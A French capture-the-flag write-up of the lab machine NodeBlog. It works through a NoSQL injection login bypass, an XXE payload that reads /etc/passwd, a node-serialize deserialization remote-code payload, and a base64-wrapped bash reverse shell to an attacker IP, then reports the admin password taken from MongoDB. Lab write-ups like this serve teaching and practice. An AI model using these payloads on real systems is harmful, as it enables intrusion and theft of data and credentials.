# NodeBlog - Easy

```bash
nmap -sV -sC 10.10.11.139 -p- 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 15:52 EDT
Nmap scan report for 10.10.11.139
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds
```

On va donc sur le site sur le port 5000, on lance un gobuster. Rien de concluant donc on va essayer avec SQLmap sur la page de login

```bash
[16:02:22] [CRITICAL] all tested parameters do not appear to be injectable.
```

Vu que c’est du node on peut essayer SSTI car en plus le site peut nous servir d’oracle avec invalid username ou invalid password, ça ne marche pas

On va alors essayer une nosql injection [https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql](https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql)

On arrive à se connecter avec ce payload:

```bash
{"user": "admin", "password": {"$ne": "admin"} }
```

Il est possible d’upload des fichiers XML donc on va essayer une XEE:

```bash
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><post><title>test</title><description>&test;</description></post>
```

On obtient bien le /etc/passwd donc on va essayer d’obtenir les fichiers du serveur, on ne sait pas ou ils sont alors on va essayer de trigger un erreur pour peut être révéler le path.

Si on essaye l’injection NoSQL en faisant exprès de rater on a une erreur qui contient ceci:

```bash
SyntaxError: Unexpected token p in JSON at position 18<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)v
```

On obtient le code du serveur si on va dans /opt/blog/server.js

```jsx
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}

app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)

app.listen(5000)
```

On voit que il y a de la serialisation, ce qui est souvent vulnérable à des attaques : [https://security.snyk.io/vuln/npm:node-serialize:20170208](https://security.snyk.io/vuln/npm:node-serialize:20170208)

Le payload est donc:

```jsx
'{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
```

Quand on regarde le cookie on a bien cette valeur en base64:

```json
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

On a donc ce message au total:

```json
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"ls /\", function(error, stdout, stderr) { console.log(stdout) });}()"}
```

Pour que le payload passe il faut URL-encode TOUT le payload. Avec un reverse shell ça ne marche pas directement donc on essaye d’encoder en base64:

```bash
echo -n '/bin/bash -i >& /dev/tcp/10.10.16.6/9090 0>&1' | base64

L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjYvOTA5MCAwPiYx
```

Et il suffira d’executer:

```bash
echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjYvOTA5MCAwPiYx | base64 -d | bash
```

Il faut maintenant trouver quelque chose pour privesc, on peut chercher dans la bdd mongo qui est apparemment dans localhost/blog

```bash
mongodump
```

L’utilitaire est déjà installé et on obtient le mdp de admin: IppsecSaysPleaseSubscribe qui nous donne l’accès à root.